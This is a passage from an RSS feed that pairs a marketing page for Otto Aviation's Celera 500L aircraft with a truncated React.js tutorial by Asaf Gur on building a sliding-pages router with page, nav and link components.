          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597502094055-EW3SX7P2Z5ZL3G41E1JU/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/6.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597502094055-EW3SX7P2Z5ZL3G41E1JU/ke17ZwdGBToddI8pDm48kKTVDeiBY4II7-kvJzZHagmoCXeSvxnTEQmG4uwOsdIceAoHiyRoc52GMN5_2H8Wp0S7Cz75sJpqvqzpGW0LUmpf9zxa-W_4pC_Y5qWT5Eks4nRF1v8cXqexZ694-uSHVQ/6.png" data-image-dimensions="51x51" data-image-focal-point="0.5,0.5" alt="6.png" data-load="false" data-image-id="5f37f28e3466a3251476568c" data-type="image" src="https://www.ottoaviation.com/6.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1597500732754_69516"><p><h3>Takeoff performance of a Midsize Jet</h3></p></div></div></div></div></div></div>
        </div>
        
          
        
      </section>

    

  

    

      <section id="new-page-26" data-collection-id="5f36a1498160027894b3d5de" data-parallax-id="5f36a1498160027894b3d5de" data-edit-main-image="Background">
        
        <div>
          <div data-type="page" data-updated-on="1598484229000" id="page-5f36a1498160027894b3d5de"><div><div><div data-block-type="2" id="block-c59e4bb877f1f21f0644"><div><h2>LOW DRAG MEANS HIGH EFFICIENCY.</h2><p>The Celera 500L is designed for transcontinental range with operating costs equal to or better than commercial airline ticket pricing on a per passenger basis. This criteria requires extremely low drag across the entire aircraft with a highly fuel efficient propulsion system. To achieve this, extensive use of laminar shapes was used for the wings, fuselage, and tail sections.  </p></div></div><div data-aspect-ratio="60" data-block-type="5" id="block-8c7f602662956732116d"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597950377596-LQ1P3AVQYDJQ1F7HBLWZ/ke17ZwdGBToddI8pDm48kPZI7OQ4oC9FyU5nN5vI5bAUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcVvM9sRO-hBAbr9gzwfR_k9eZAy2imSbMs_JDRrhtCaMkVa4omn_xl7vxitXxYIOU/Window+Rendering.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597950377596-LQ1P3AVQYDJQ1F7HBLWZ/ke17ZwdGBToddI8pDm48kPZI7OQ4oC9FyU5nN5vI5bAUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcVvM9sRO-hBAbr9gzwfR_k9eZAy2imSbMs_JDRrhtCaMkVa4omn_xl7vxitXxYIOU/Window+Rendering.png" data-image-dimensions="1280x408" data-image-focal-point="0.5,0.5" alt="Window Rendering.png" data-load="false" data-image-id="5f3ec9a88316491b62724dd4" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597950377596-LQ1P3AVQYDJQ1F7HBLWZ/ke17ZwdGBToddI8pDm48kPZI7OQ4oC9FyU5nN5vI5bAUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYxCRW4BPu10St3TBAUQYVKcVvM9sRO-hBAbr9gzwfR_k9eZAy2imSbMs_JDRrhtCaMkVa4omn_xl7vxitXxYIOU/Window+Rendering.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div></div></div>
        </div>
        
          
        
      </section>

    

  

    

      <section id="new-page-13" data-parallax-original-element="" data-collection-id="5f36ac4b4a9f8a16b45aacf5" data-parallax-id="5f36ac4b4a9f8a16b45aacf5" data-edit-main-image="Background">
        
        <div>
          <div data-type="page" data-updated-on="1598484247296" id="page-5f36ac4b4a9f8a16b45aacf5"><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1597512042385_243977"><p><h3>THE 4,500 NAUTICAL MILE RANGE MEANS <br>THE CELERA 500L CAN SERVICE VIRTUALLY <br>ANY CITY PAIR IN THE U.S. WITHOUT REFUELING.</h3></p></div></div></div></div>
        </div>
        
          
            <figure data-parallax-image-wrapper="">
              
  <img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500708626-YO4GUKLWYAW0W3WJUX6D/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0pE4cef1KNtWo36k-CFnr6wOF2g5O-PFkVuvW_ba6dQUZZpzEt6WQHHQe4EHY-NJIA/IMG_1570+editedBANNERCG.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500708626-YO4GUKLWYAW0W3WJUX6D/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0pE4cef1KNtWo36k-CFnr6wOF2g5O-PFkVuvW_ba6dQUZZpzEt6WQHHQe4EHY-NJIA/IMG_1570+editedBANNERCG.png" data-image-dimensions="2500x1667" data-image-focal-point="0.5,0.5" alt="IMG_1570 editedBANNERCG.png" data-load="false" src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597500708626-YO4GUKLWYAW0W3WJUX6D/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0pE4cef1KNtWo36k-CFnr6wOF2g5O-PFkVuvW_ba6dQUZZpzEt6WQHHQe4EHY-NJIA/IMG_1570+editedBANNERCG.png">

            </figure>
          
        
      </section>

    

  

    

      <section id="new-page-58" data-parallax-original-element="" data-collection-id="5f36b0f412f21a60e314118f" data-parallax-id="5f36b0f412f21a60e314118f" data-edit-main-image="Background">
        
        <div>
          <div data-type="page" data-updated-on="1597948602600" id="page-5f36b0f412f21a60e314118f"><div><div><div data-aspect-ratio="197.92746113989637" data-block-type="5" id="block-yui_3_17_2_1_1597512042385_217663"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597948578823-KYRYWUVCBKAJB8KBQWEX/ke17ZwdGBToddI8pDm48kO1J1nhEoAQzUoWk64THNulZw-zPPgdn4jUwVcJE1ZvWEtT5uBSRWt4vQZAgTJucoTqqXjS3CfNDSuuf31e0tVEMlsEwFgJwtGRRrANS2aYUah82UiDQ_hVtRYkDgul7Ie87Nsj43NRAr6WuWZv5DKs/Project-timeline.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597948578823-KYRYWUVCBKAJB8KBQWEX/ke17ZwdGBToddI8pDm48kO1J1nhEoAQzUoWk64THNulZw-zPPgdn4jUwVcJE1ZvWEtT5uBSRWt4vQZAgTJucoTqqXjS3CfNDSuuf31e0tVEMlsEwFgJwtGRRrANS2aYUah82UiDQ_hVtRYkDgul7Ie87Nsj43NRAr6WuWZv5DKs/Project-timeline.png" data-image-dimensions="386x554" data-image-focal-point="0.5,0.5" alt="Project-timeline.png" data-load="false" data-image-id="5f3ec2a27ed0c018c9339e54" data-type="image" src="https://www.ottoaviation.com/Project-timeline.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div></div></div>
        </div>
        
          
            <figure data-parallax-image-wrapper="">
              
  <img data-src="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597420895742-4TY7XLGOCPCZQ4DPHDDC/ke17ZwdGBToddI8pDm48kCX-V5vw-8h9IBXN10-_8XN7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0k2HH6OEm6WCCYLibno-s8b4weTEWBRU0WHPO2pE1u2Ju0c04VQ6HZ7fTjtKQ38BuA/TimelineBkgpsd.png" data-image="https://images.squarespace-cdn.com/content/v1/5f3541f19bb2e80bcd4b0f98/1597420895742-4TY7XLGOCPCZQ4DPHDDC/ke17ZwdGBToddI8pDm48kCX-V5vw-8h9IBXN10-_8XN7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0k2HH6OEm6WCCYLibno-s8b4weTEWBRU0WHPO2pE1u2Ju0c04VQ6HZ7fTjtKQ38BuA/TimelineBkgpsd.png" data-image-dimensions="2500x1407" data-image-focal-point="0.5,0.5" alt="TimelineBkgpsd.png" data-load="false" src="https://www.ottoaviation.com/TimelineBkgpsd.png">

            </figure>
          
        
      </section>

    

  

  
    <nav>
      
    </nav>
            
          </main>

        </div>
      </div>

      


    </div></div>]]>
            </description>
            <link>https://www.ottoaviation.com/celera-500l</link>
            <guid isPermaLink="false">hacker-news-small-sites-24577235</guid>
            <pubDate>Thu, 24 Sep 2020 10:43:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sliding Pages with React.js]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577233">thread link</a>) | @asafg6
<br/>
September 24, 2020 | https://www.turtle-techies.com/sliding-pages-with-react-js/ | <a href="https://web.archive.org/web/*/https://www.turtle-techies.com/sliding-pages-with-react-js/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
        
        <h4>A step by step guide to writing your own sliding pages router</h4>
                <h6>
                    By Asaf Gur, Published 2018-07-03
                </h6>
    </p><div itemprop="articleBody"><h2 id="make-them-slide">Make Them Slide!</h2>
<p>The popular way to achieve routing in React is using <a href="https://github.com/ReactTraining/react-router" target="_blank">React Router v4</a>. React Router works great, but it doesn't make the pages slide. Of course, you can use a package like <a href="https://www.npmjs.com/package/react-router-page-transition" target="_blank">React Router Page Transition</a> to make that happen.<br>
We are not going to use either of that packages in this tutorial. Instead, we will roll our own and create a sliding pages router.<br>
This tutorial is for learning purposes, If you want to use the final code in production it would require some more work.<br>
The complete solution is on github and you can find it <a href="https://github.com/asafg6/react-sliding-pages" target="_blank">here</a></p>
<h2 id="prerequisites">Prerequisites</h2>
<p>You should be comfortable with HTML, Javascript, css and React.</p>
<h2 id="step-1---setup">Step 1 - Setup</h2>
<p>we'll use create-react-app. If you don't have React installed, <a href="https://reactjs.org/docs/add-react-to-a-new-app.html" target="_blank">install it</a>.</p>
<p>Let's create our new app:</p>
<div><pre><code data-lang="shell">$ create-react-app react-sliding-pages
</code></pre></div><p>Alright! First step complete!
Feel free to delete logo.svg, we won't be using it.  <br>
You can cd into the project's directory and run <strong>npm start</strong>, so you can watch your progress.</p>
<h2 id="step-2---creating-the-page-element">Step 2 - Creating The Page Element</h2>
<p>Create a new file called page.js under the src directory.</p>
<p><strong>page.js</strong></p>
<div><pre><code data-lang="javascript">
<span>import</span> <span>React</span>, { <span>Component</span> } <span>from</span> <span>'react'</span>;


<span>class</span> <span>Page</span> <span>extends</span> <span>Component</span> {

    <span>constructor</span>(<span>props</span>) {
        <span>super</span>(<span>props</span>);
    }


    <span>render</span>() {
        <span>return</span> (
            <span>&lt;</span><span>div</span> <span>style</span><span>=</span>{{
                <span>width</span><span>:</span> <span>'100vw'</span>, 
                <span>height</span><span>:</span> <span>'100%'</span>,
                <span>position</span><span>:</span> <span>'fixed'</span>,
                <span>top</span><span>:</span> <span>0</span>,
                <span>left</span><span>:</span> <span>0</span>,
                <span>transform</span><span>:</span> <span>'translateX('</span><span>+</span> <span>this</span>.<span>props</span>.<span>left</span> <span>+</span> <span>'px)'</span>,
                <span>animationTimingFunction</span><span>:</span> <span>'ease-in'</span>,
                <span>zIndex</span><span>:</span> <span>-</span><span>20</span>,
                <span>transition</span><span>:</span> <span>'transform .8s ease-in-out'</span>
            }}<span>&gt;</span>
                {<span>this</span>.<span>props</span>.<span>children</span>}
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
        );

    }

}

<span>export</span> <span>default</span> <span>Page</span>;


</code></pre></div><p>There's a few things to pay attention to in this component.<br>
First of all, this is a container component ‚Äî we use <strong>this.props.children</strong> to render all child components.<br>
The other two are in the css:<br>
The <strong>transformX</strong> property is determined by the <strong>left</strong> prop.<br>
The transition and <strong>animationTimingFunction</strong> controls the animation and makes the sliding happen.</p>
<p>Now that we have our page component, we should try to use it.</p>
<h2 id="step-3---sliding-the-page">Step 3 - Sliding The Page</h2>
<p>Let's take care of some crucial styling. Change the contents of App.css to this:</p>
<p><strong>App.css</strong></p>
<div><pre><code data-lang="css">
.<span>App</span> {
  <span>text-align</span>: <span>center</span>;
}

.<span>page</span> {
  <span>width</span>: <span>300</span><span>px</span>;
  <span>height</span>: <span>100</span><span>%</span>;
  <span>min-height</span>: <span>5</span><span>em</span>;
  <span>margin-right</span>: <span>auto</span>;
  <span>margin-left</span>: <span>auto</span>;
  <span>margin-top</span>: <span>5</span><span>em</span>;
  <span>padding</span>: <span>2</span><span>em</span>;
  <span>z-index</span>: <span>15000</span>;
}

</code></pre></div><p>Change the contents of App.js to:</p>
<p><strong>App.js</strong></p>
<div><pre><code data-lang="javascript">
<span>import</span> <span>React</span>, { <span>Component</span> } <span>from</span> <span>'react'</span>;
<span>import</span> <span>'./App.css'</span>;
<span>import</span> <span>Page</span> <span>from</span> <span>'./page'</span>;

<span>class</span> <span>App</span> <span>extends</span> <span>Component</span> {

  <span>constructor</span>(<span>props</span>) {
    <span>super</span>(<span>props</span>);
    <span>this</span>.<span>state</span> <span>=</span> {<span>left</span><span>:</span> <span>0</span>}
  }


  <span>render</span> () {
    <span>return</span> (
      <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>'App'</span><span>&gt;</span>
        <span>&lt;</span><span>div</span><span>&gt;</span>
          <span>&lt;</span><span>input</span> <span>type</span><span>=</span><span>"text"</span> <span>onChange</span><span>=</span>{(<span>e</span>) =&gt; <span>this</span>.<span>setState</span>({<span>left</span><span>:</span> parseInt(<span>e</span>.<span>target</span>.<span>value</span>)})} <span>/</span><span>&gt;</span>
        <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
        <span>&lt;</span><span>Page</span> <span>left</span><span>=</span>{<span>this</span>.<span>state</span>.<span>left</span>}<span>&gt;</span>
          <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>'page'</span> <span>style</span><span>=</span>{{ <span>backgroundColor</span><span>:</span> <span>'green'</span> }}<span>&gt;</span>
            <span>bla1</span>
          <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
        <span>&lt;</span><span>/</span><span>P</span><span>a</span><span>g</span><span>e</span><span>&gt;</span>
      <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
    )
  }
}

<span>export</span> <span>default</span> <span>App</span>

</code></pre></div><p>Play around with the input, try typing 1000 or -500 and see what happens. If everything went well, the page should slide across the screen.<br>
So what did we do here?<br>
We created a state variable called <strong>left</strong> and passed it to our page component. When the input changes, it triggers the <strong>setState</strong> method and changes the page's left property.<br>
That's nice, but it's only one page. We need an element that will wrap our page components and switch them.</p>
<h2 id="step-4---creating-the-nav-element">Step 4 - Creating The Nav Element</h2>
<p>This is the main part of our program and where the most logic is.
Let's create our Nav element in small parts.</p>
<p>We'll start with an empty component. Create a new file called nav.js under the src directory.<br>
<strong>nav.js</strong></p>
<div><pre><code data-lang="javascript">
<span>import</span> <span>React</span>, { <span>Component</span> } <span>from</span> <span>'react'</span>;


<span>class</span> <span>Nav</span> <span>extends</span> <span>Component</span> {

}

<span>export</span> <span>default</span> <span>Nav</span>;
</code></pre></div><p>The plan is to place the current page in the middle of the screen and hide the other pages on the sides of the screen. To achieve that, we'll need to know the screen width.
The <strong>left</strong> prop worked well before, so we'll use it here as well.</p>
<p>Let's create the constructor for the Nav component:</p>
<p><strong>nav.js</strong></p>
<div><pre><code data-lang="javascript">
...

    <span>constructor</span>(<span>props</span>) {
        <span>super</span>(<span>props</span>);
        <span>this</span>.<span>width</span> <span>=</span> window.<span>innerWidth</span> <span>||</span> document.<span>documentElement</span>.<span>clientWidth</span> <span>||</span> document.<span>body</span>.<span>clientWidth</span>;
        <span>let</span> <span>left</span> <span>=</span> <span>props</span>.<span>children</span>.<span>map</span>(<span>o</span> =&gt; <span>this</span>.<span>width</span>);
        <span>if</span> (<span>left</span>.<span>length</span> <span>&gt;</span> <span>0</span> ) {
            <span>left</span>[<span>0</span>] <span>=</span> <span>0</span>;
        }
        <span>this</span>.<span>state</span> <span>=</span> {<span>page</span><span>:</span> <span>0</span>, <span>left</span><span>:</span> <span>left</span>};        
    }

...

</code></pre></div><p>We now have the screen's width in <strong>this.width</strong>, an array of integers that represents the pages‚Äô left property and a page that represents the current page number.</p>
<p>Now let's add the <strong>move</strong> method:</p>
<p><strong>nav.js</strong></p>
<div><pre><code data-lang="javascript">...

    <span>move</span>(<span>page</span>) {
        <span>const</span> <span>left</span> <span>=</span> <span>this</span>.<span>state</span>.<span>left</span>.<span>slice</span>();
        <span>if</span> (<span>page</span> <span>&gt;=</span> <span>left</span>.<span>length</span>) {
          <span>page</span> <span>=</span> <span>0</span>;
        }
        <span>for</span> (<span>let</span> <span>i</span> <span>=</span> <span>0</span>; <span>i</span> <span>&lt;</span> <span>left</span>.<span>length</span>; <span>i</span><span>++</span> ) {
          <span>if</span> (<span>i</span> <span>&lt;</span> <span>page</span>) {
            <span>left</span>[<span>i</span>] <span>=</span> <span>-</span><span>this</span>.<span>width</span>;
          } <span>else</span> <span>if</span> (<span>i</span> <span>===</span> <span>page</span>) {
            <span>left</span>[<span>i</span>] <span>=</span> <span>0</span>;
          } <span>else</span> {
            <span>left</span>[<span>i</span>] <span>=</span> <span>this</span>.<span>width</span>;
          }
        }    
        <span>this</span>.<span>setState</span>({<span>left</span><span>:</span> <span>left</span>, <span>page</span><span>:</span> <span>page</span>})
      }
      
...
</code></pre></div><p>Take a moment to read the code and understand what it does.</p>
<p>Basically, the code iterates on a copy of the left array and sets each page's left location according to the page number.</p>
<p>Let's continue to the <strong>render</strong> method.</p>
<p><strong>nav.js</strong></p>
<div><pre><code data-lang="javascript">...

    <span>render</span>() {
        <span>const</span> <span>pageElements</span> <span>=</span> <span>React</span>.<span>Children</span>.<span>map</span>(<span>this</span>.<span>props</span>.<span>children</span>, (<span>page</span>, <span>idx</span>) =&gt;
            <span>React</span>.<span>cloneElement</span>(<span>page</span>, { <span>left</span><span>:</span> <span>this</span>.<span>state</span>.<span>left</span>[<span>idx</span>] })); 
        <span>return</span> (
            <span>&lt;</span><span>div</span><span>&gt;</span>
                {<span>pageElements</span>}
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
        );
    }

...
</code></pre></div><p>Here, we use <strong>React.Children.map</strong> to iterate over the page elements and add the left prop.</p>
<p>Now let's use our new Nav element in App.js.</p>
<p><strong>App.js</strong></p>
<div><pre><code data-lang="javascript">
<span>import</span> <span>React</span>, { <span>Component</span> } <span>from</span> <span>'react'</span>;
<span>import</span> <span>'./App.css'</span>;
<span>import</span> <span>Page</span> <span>from</span> <span>'./page'</span>;
<span>import</span> <span>Nav</span> <span>from</span> <span>'./nav'</span>;

<span>class</span> <span>App</span> <span>extends</span> <span>Component</span> {

  <span>constructor</span>(<span>props</span>) {
    <span>super</span>(<span>props</span>);
  }



  <span>render</span>() {
    <span>return</span> (
      <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"App"</span><span>&gt;</span>
        <span>&lt;</span><span>Nav</span><span>&gt;</span>
          <span>&lt;</span><span>Page</span><span>&gt;</span>
            <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"page"</span> <span>style</span><span>=</span>{{ <span>backgroundColor</span><span>:</span> <span>'green'</span> }}<span>&gt;</span>
              <span>bla1</span>
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
          <span>&lt;</span><span>/</span><span>P</span><span>a</span><span>g</span><span>e</span><span>&gt;</span>
          <span>&lt;</span><span>Page</span><span>&gt;</span>
            <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"page"</span> <span>style</span><span>=</span>{{ <span>backgroundColor</span><span>:</span> <span>'red'</span> }}<span>&gt;</span>
              <span>bla1</span>
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
          <span>&lt;</span><span>/</span><span>P</span><span>a</span><span>g</span><span>e</span><span>&gt;</span>
          <span>&lt;</span><span>Page</span><span>&gt;</span>
            <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"page"</span> <span>style</span><span>=</span>{{ <span>backgroundColor</span><span>:</span> <span>'blue'</span> }}<span>&gt;</span>
              <span>bla1</span>
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
          <span>&lt;</span><span>/</span><span>P</span><span>a</span><span>g</span><span>e</span><span>&gt;</span>
          <span>&lt;</span><span>Page</span><span>&gt;</span>
            <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"page"</span> <span>style</span><span>=</span>{{ <span>backgroundColor</span><span>:</span> <span>'brown'</span> }}<span>&gt;</span>
              <span>bla1</span>
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
          <span>&lt;</span><span>/</span><span>P</span><span>a</span><span>g</span><span>e</span><span>&gt;</span>
        <span>&lt;</span><span>/</span><span>N</span><span>a</span><span>v</span><span>&gt;</span>
        
      <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
    );
  }
}

<span>export</span> <span>default</span> <span>App</span>;


</code></pre></div><p>In case everything worked well, you should see the first page rendered in your browser. You can check the html source (using the browser's dev tools) and see that all the child elements are indeed rendered.</p>
<p>Alright, so we have all the pages but no access to the <strong>move</strong> method. Let's add some buttons temporarily just to see that the slide works.</p>
<p><strong>nav.js</strong></p>
<div><pre><code data-lang="javascript">...

    <span>render</span>() {
        <span>const</span> <span>pageElements</span> <span>=</span> <span>React</span>.<span>Children</span>.<span>map</span>(<span>this</span>.<span>props</span>.<span>children</span>, (<span>page</span>, <span>idx</span>) =&gt;
            <span>React</span>.<span>cloneElement</span>(<span>page</span>, { <span>left</span><span>:</span> <span>this</span>.<span>state</span>.<span>left</span>[<span>idx</span>] })); 
        <span>const</span> <span>buttonElements</span> <span>=</span> <span>React</span>.<span>Children</span>.<span>map</span>(<span>this</span>.<span>props</span>.<span>buttons</span>, (<span>button</span>, <span>idx</span>) =&gt; {
            <span>let</span> <span>newButton</span> <span>=</span> <span>React</span>.<span>cloneElement</span>(<span>button</span> , { <span>onClick</span><span>:</span> () =&gt; <span>this</span>.<span>move</span>(<span>idx</span>), ...<span>button</span>.<span>props</span>});
            <span>return</span> <span>newButton</span>;
        });
        <span>return</span> (
            <span>&lt;</span><span>div</span><span>&gt;</span>
                <span>&lt;</span><span>div</span><span>&gt;</span>
                    {<span>buttonElements</span>}
                <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
                <span>&lt;</span><span>div</span><span>&gt;</span>
                    {<span>pageElements</span>}
                <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
        );
    }

...
</code></pre></div><p><strong>App.js</strong></p>
<div><pre><code data-lang="javascript">...

  <span>render</span>() {
    <span>let</span> <span>buttons</span> <span>=</span> [];
    <span>for</span> (<span>let</span> <span>i</span> <span>=</span> <span>0</span>; <span>i</span> <span>&lt;</span> <span>4</span>; <span>i</span><span>++</span>) {
      <span>let</span> <span>button</span> <span>=</span> <span>&lt;</span><span>button</span> <span>key</span><span>=</span>{<span>i</span>.<span>toString</span>()}<span>&gt;</span>{<span>i</span>}<span>&lt;</span><span>/</span><span>b</span><span>u</span><span>t</span><span>t</span><span>o</span><span>n</span><span>&gt;</span><span>;</span>
      <span>buttons</span>.<span>push</span>(<span>button</span>);
    }
    <span>return</span> (
      <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"App"</span><span>&gt;</span>
        <span>&lt;</span><span>Nav</span> <span>buttons</span><span>=</span>{<span>buttons</span>}<span>&gt;</span>
          <span>&lt;</span><span>Page</span><span>&gt;</span>
            <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"page"</span> <span>style</span><span>=</span>{{ <span>backgroundColor</span><span>:</span> <span>'green'</span> }}<span>&gt;</span>
              <span>bla1</span>
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
          <span>&lt;</span><span>/</span><span>P</span><span>a</span><span>g</span><span>e</span><span>&gt;</span>
          <span>&lt;</span><span>Page</span><span>&gt;</span>
            <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"page"</span> <span>style</span><span>=</span>{{ <span>backgroundColor</span><span>:</span> <span>'red'</span> }}<span>&gt;</span>
              <span>bla1</span>
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
          <span>&lt;</span><span>/</span><span>P</span><span>a</span><span>g</span><span>e</span><span>&gt;</span>
          <span>&lt;</span><span>Page</span><span>&gt;</span>
            <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"page"</span> <span>style</span><span>=</span>{{ <span>backgroundColor</span><span>:</span> <span>'blue'</span> }}<span>&gt;</span>
              <span>bla1</span>
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
          <span>&lt;</span><span>/</span><span>P</span><span>a</span><span>g</span><span>e</span><span>&gt;</span>
          <span>&lt;</span><span>Page</span><span>&gt;</span>
            <span>&lt;</span><span>div</span> <span>className</span><span>=</span><span>"page"</span> <span>style</span><span>=</span>{{ <span>backgroundColor</span><span>:</span> <span>'brown'</span> }}<span>&gt;</span>
              <span>bla1</span>
            <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
          <span>&lt;</span><span>/</span><span>P</span><span>a</span><span>g</span><span>e</span><span>&gt;</span>
        <span>&lt;</span><span>/</span><span>N</span><span>a</span><span>v</span><span>&gt;</span>
        
      <span>&lt;</span><span>/</span><span>d</span><span>i</span><span>v</span><span>&gt;</span>
    );
  }

...
</code></pre></div><p>Try the buttons in your browser, the pages should slide.</p>
<p>Now that the basic functionality works, let's make our Nav element more router like.</p>
<h2 id="step-5---implement-routing">Step 5 - Implement Routing</h2>
<p>First, remove the buttons we used for testing. We don't need them.
With that out of the way, create a new file called link.js under the src directory.</p>
<p><strong>link.js</strong></p>
<div><pre><code data-lang="javascript">
<span>import</span> <span>React</span>, { <span>Component</span> } <span>from</span> <span>'react'</span>;


<span>class</span> <span>Link</span> <span>extends</span> <span>Component</span> {

    <span>go</span>() {
        window.<span>location</span>.<span>hash</span> <span>=</span> <span>this</span>.<span>props</span>.<span>to</span>.<span>slice</span>(<span>1</span>);
    }

    <span>render</span>() {
        <span>return</span> (
            <span>&lt;</span><span>i</span> <span>onClick</span><span>=</span>{() =&gt; <span>this</span>.<span>go</span>()}<span>&gt;</span>
                {<span>this</span>.<span>props</span>.<span>children</span>}
            <span>&lt;</span><span>/</span><span>i</span><span>&gt;</span>

        );
    }

}

<span>export</span> <span>default</span> <span>Link</span>;

</code></pre></div><p>This component is pretty straight forward, it renders the component's children and changes the hash on a click according to the <strong>to</strong> prop.</p>
<p>Let's make our Nav component react to hash changes.</p>
<p><strong>nav.js</strong></p>
<div><pre><code data-lang="javascript">...

    <span>constructor</span>(<span>props</span>) {
        <span>super</span>(<span>props</span>);
        <span>this</span>.<span>width</span> <span>=</span> window.<span>innerWidth</span> <span>||</span> document.<span>documentElement</span>.<span>clientWidth</span> <span>||</span> document.<span>body</span>.<span>clientWidth</span>;
        <span>let</span> <span>left</span> <span>=</span> <span>props</span>.<span>children</span>.<span>map</span>(<span>o</span> =&gt; <span>this</span>.<span>width</span>);
        <span>if</span> (<span>left</span>.<span>length</span> <span>&gt;</span> <span>0</span> ) {
            <span>left</span>[<span>0</span>] <span>=</span> <span>0</span>;
        }
        <span>this</span>.<span>state</span> <span>=</span> {<span>page</span><span>:</span> <span>0</span>, <span>left</span><span>:</span> <span>left</span>, <span>from</span><span>:</span> <span>left</span>};
        <span>this</span>.<span>pages</span> <span>=</span> {};
    }

...

    <span>componentDidMoun‚Ä¶</span></code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.turtle-techies.com/sliding-pages-with-react-js/">https://www.turtle-techies.com/sliding-pages-with-react-js/</a></em></p>]]>
            </description>
            <link>https://www.turtle-techies.com/sliding-pages-with-react-js/</link>
